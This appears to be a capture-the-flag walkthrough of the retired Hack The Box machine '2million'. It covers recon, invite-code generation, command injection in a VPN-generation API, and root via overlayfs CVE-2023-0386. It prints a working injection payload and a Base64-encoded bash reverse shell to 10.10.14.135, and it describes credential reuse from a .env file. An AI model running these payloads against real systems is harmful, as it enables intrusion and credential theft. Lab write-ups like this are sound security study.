# 2million - Retired Machine - Guided Mode

```bash
nmap -p- -sV -sC --min-rate 500 <ipaddress>
```

Saw two open ports — an SSH and HTTP port.

In the HTTP port part, it says that it redirects to a domain.

Added the domain and IP in the `/etc/hosts` file.

Opened the HTTP site in the browser. Could see that we can log in, but to register we need an invite code.

Turned on BurpSuite proxy, and I could see that when we go to `/invite` to give the invite code, it calls a JS file called:

```
inviteapi.min.js
```

It contained obscured JS code using `eval()`, so I copied and put the code in:

[https://lelinhtinh.github.io/de4js/](https://lelinhtinh.github.io/de4js/)

This revealed two functions with AJAX calls. One function is called `makeInviteCode`, and it has an AJAX call.

Using BurpSuite Repeater, I simulated the AJAX call and it returned instructions which were encoded in **ROT13**. Using a ROT13-to-text converter, I got the actual endpoint which we had to use — something like:

```
/invite/generate
```

(Might be wrong)

Once I hit that API using Repeater, it returned a code encoded in **Base64**, which I then converted to normal text using an online Base64-to-text converter — and we get the **invite code**.

Then we sign up and login as a user. I tried all the API calls that happen in the web app.

Now we notice that all the API calls start with `/api/v1`.

When I hit that directly, it returns **all the routes**, including admin routes.

There’s a route to generate a VPN for a particular user. When we hit it with an empty body, it responds asking for a `username` param in the body.

When passed, it returns the VPN file for that particular user — so it should be executing commands in the OS to generate VPN files. In the `username` property, we pass something like:

```bash
blah;whoami;
```

And it returned the name `www-data`. So we pass a reverse shell bash script encoded in Base64.

We encode this:

```bash
echo 'bash -i >& /dev/tcp/10.10.14.135/1234 0>&1'
```

Then we pass the param like:

```bash
blah;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzUvMTIzNCAwPiYx | base64 -d | bash;
```

Then we get the reverse shell.

We see in the web app files a `.env` file which had the DB password. I reused it for a user I found by reading `/etc/passwd`, which had a user called `admin`. I used the username and password for the SSH login and got in.

Before all that I kinda stumbled around, connected to the MySQL DB with credentials in the `.env` file and dumped the DB, but the passwords were salted so I couldn’t crack them without the key — idk if I should have gone about it more, but I moved on with the walkthrough.

Now as logged in as `admin`, got the **user flag**.

In one of the emails in `/var/mail`, we see a mail from someone saying to fix a vulnerability regarding **overlayfs** by updating OS. We find the CVE which is:

```
CVE-2023-0386
```

Found a PoC exploit and git cloned it into my device. Used `tar` to archive it and then hosted it with a simple Python server.

On the victim’s terminal, using `wget`, I downloaded it and ran the exploit as mentioned in the README — and got **root terminal access** and got the **root flag**.

In the walkthrough, there was mention of another alternate way to privilege escalate if I had checked:

```bash
ldd --version
```

Which returned version 2.35, which is vulnerable to:

```
CVE-2023-4911
```

This one exploits a stack buffer overflow while reading the env variable `GLIBC_TUNABLES`.
